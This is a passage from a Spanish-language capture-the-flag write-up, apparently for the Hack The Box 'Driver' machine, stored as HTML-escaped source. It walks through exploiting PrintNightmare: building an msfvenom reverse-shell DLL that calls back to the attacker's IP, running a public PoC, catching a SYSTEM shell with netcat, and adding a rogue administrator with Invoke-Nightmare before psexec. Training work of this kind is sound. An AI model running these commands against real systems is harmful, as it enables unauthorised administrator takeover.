+*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;printnightmare&#34;&gt;PrintNightmare&lt;/h2&gt;
+&lt;p&gt;Recientemente se descubrió una vulnerabilidad en el servicio Spooler que permite escalar privilegios - (&lt;a href=&#34;https://msrc.microsoft.com/update-guide/vulnerability/cve-2021-34527&#34;&gt;CVE-2021-34527&lt;/a&gt;). Al &lt;a href=&#34;https://github.com/cube0x0/CVE-2021-1675#scanning&#34;&gt;escanear&lt;/a&gt; la maquina utilizando &lt;code&gt;rpcdump&lt;/code&gt; vemos que podria ser vulnerable.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/driver ❯ impacket-rpcdump tony:liltony@driver.htb &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; egrep &lt;span class=&#34;s1&#34;&gt;&amp;#39;MS-RPRN|MS-PAR&amp;#39;&lt;/span&gt;
+Protocol: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;MS-PAR&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: Print System Asynchronous Remote Protocol
+Protocol: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;MS-RPRN&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: Print System Remote Protocol
+ π ~/htb/driver ❯
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;cube0x0&#34;&gt;cube0x0&lt;/h2&gt;
+&lt;p&gt;Para explotar la vulnerabilidad utilizamos el PoC de &lt;a href=&#34;https://github.com/cube0x0/&#34;&gt;cube0x0&lt;/a&gt; que encontramos en el Repositorio de &lt;a href=&#34;https://github.com/cube0x0/CVE-2021-1675#installation&#34;&gt;GitHub - CVE-2021-1675&lt;/a&gt;, realizamos la instalación de la version modificada de &lt;code&gt;impacket&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;pip3 uninstall impacket
+git clone https://github.com/cube0x0/impacket
+&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; impacket
+python3 ./setup.py install
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Para la explotación necesitamos un servidor samba, &lt;code&gt;impacket&lt;/code&gt; provee el script &lt;code&gt;smbserver&lt;/code&gt; para crear uno.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/driver ❯ impacket-smbserver sc .
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; SecureAuth Corporation
+
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Config file parsed
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Callback added &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Callback added &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Config file parsed
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Config file parsed
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Config file parsed
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;El PoC necesita un &lt;code&gt;DLL&lt;/code&gt; el cual es ejecutado, utilizamos &lt;code&gt;msfvenom&lt;/code&gt; para generar una &lt;code&gt;DLL&lt;/code&gt; con shell inversa, almancenando esta en el directorio donde ejecutamos &lt;code&gt;smbserver&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/driver ❯ msfvenom -p windows/x64/shell_reverse_tcp &lt;span class=&#34;nv&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;tun0 &lt;span class=&#34;nv&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1339&lt;/span&gt; -f dll -o sc.dll
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: &lt;span class=&#34;m&#34;&gt;460&lt;/span&gt; bytes
+Final size of dll file: &lt;span class=&#34;m&#34;&gt;8704&lt;/span&gt; bytes
+Saved as: sc.dll
+ π ~/htb/driver ❯
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Finalmente ejcutamos el PoC pasando las credenciales y la dirección del DLL en nuestro servidor samba.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/driver ❯ ./CVE-2021-1675.py tony:liltony@driver.htb &lt;span class=&#34;s1&#34;&gt;&amp;#39;\\10.10.14.30\sc\sc.dll&amp;#39;&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Connecting to ncacn_np:driver.htb&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\P&lt;/span&gt;IPE&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;poolss&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Bind OK
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; pDriverPath Found C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;ystem32&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;riverStore&lt;span class=&#34;se&#34;&gt;\F&lt;/span&gt;ileRepository&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;tprint.inf_amd64_f66d9eed7e835e97&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;md64&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;NIDRV.DLL
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Executing &lt;span class=&#34;se&#34;&gt;\?&lt;/span&gt;?&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;NC&lt;span class=&#34;se&#34;&gt;\1&lt;/span&gt;0.10.14.30&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;c&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;c.dll
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Try 1...
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Stage0: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Try 2...
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Stage0: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Try 3...
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Con la ejecucion de netcat en el puerto especificado en &lt;code&gt;msfvenom&lt;/code&gt; obtuvimos una shell como usuario root (Administrador), finalmente nuestra flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/driver ❯ rlwrap nc -lvp &lt;span class=&#34;m&#34;&gt;1339&lt;/span&gt;
+listening on &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;any&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1339&lt;/span&gt; ...
+connect to &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.14.30&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; from driver.htb &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.11.106&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;49423&lt;/span&gt;
+Microsoft Windows &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Version 10.0.10240&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2015&lt;/span&gt; Microsoft Corporation. All rights reserved.
+
+C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem32&amp;gt; whoami
+nt authority&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem
+C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem32&amp;gt; &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;oot.txt
+bcb9fc23e9309e32a7e543d5126e88f6
+C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem32&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;powershell&#34;&gt;Powershell&lt;/h2&gt;
+&lt;p&gt;Tambien existe una version para Powershell escrita por &lt;a href=&#34;https://github.com/calebstewart/CVE-2021-1675#cve-2021-1675---printnightmare-lpe-powershell&#34;&gt;Caleb Stewart | John Hammond&lt;/a&gt; el cual crea un usuario como administrador y de igual manera es posible utilizar un DLL. Utilizando &lt;code&gt;evil-winrm&lt;/code&gt; importamos el archivo y agregamos un nuevo usuario, vemos que este pertenece al grupo de administradores.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; upload CVE-2021-1675.ps1
+Info: Uploading CVE-2021-1675.ps1 to C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;VE-2021-1675.ps1
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+Info: Upload successful!
+
+*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; cat -raw CVE-2021-1675.ps1&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;iex
+*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; Invoke-Nightmare -NewUser &lt;span class=&#34;s2&#34;&gt;&amp;#34;sckull&amp;#34;&lt;/span&gt; -NewPassword &lt;span class=&#34;s2&#34;&gt;&amp;#34;sckullx123&amp;#34;&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; created payload at C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;ppData&lt;span class=&#34;se&#34;&gt;\L&lt;/span&gt;ocal&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;emp&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;ightmare.dll
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; using &lt;span class=&#34;nv&#34;&gt;pDriverPath&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll&amp;#34;&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; added user sckull as &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; administrator
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; deleting payload from C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;ppData&lt;span class=&#34;se&#34;&gt;\L&lt;/span&gt;ocal&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;emp&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;ightmare.dll
+*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; net user sckull
+User name                    sckull
+Full Name                    sckull
+Comment
+User&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s comment
+Country/region code          &lt;span class=&#34;m&#34;&gt;000&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;System Default&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Account active               Yes
+Account expires              Never
+
+Password last &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;            10/9/2021 5:48:21 AM
+Password expires             Never
+Password changeable          10/9/2021 5:48:21 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators
+Global Group memberships     *None
+The &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; completed successfully.
+
+*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Con el usuario creado podemos acceder con full permisos de Administrador utilizando &lt;code&gt;psexec&lt;/code&gt; y obtener los hashes utilizando &lt;code&gt;secretsdump&lt;/code&gt;.&lt;br /&gt;
+
+&lt;div id=&#34;cd2f290d04244578&#34; class=&#34;codetab&#34;&gt;
+  &lt;div class=&#34;codetab__links&#34;&gt;
+    
+      &lt;button class=&#34;codetab__link&#34; aria-label=&#34;Tab link&#34;&gt;bash&lt;/button&gt;
+    
+      &lt;button class=&#34;codetab__link&#34; aria-label=&#34;Tab link&#34;&gt;bash&lt;/button&gt;
+    
+  &lt;/div&gt;
+  
+  
+&lt;div id=&#34;a239db910e039232&#34; class=&#34;codetab__content&#34;&gt;
+  &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/driver ❯ impacket-psexec sckull:sckullx123@driver.htb
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; SecureAuth Corporation
+
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Requesting shares on driver.htb.....
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Found writable share ADMIN$
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Uploading file boxhjDuT.exe
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Opening SVCManager on driver.htb.....
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Creating service Czhp on driver.htb.....
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Starting service Czhp.....
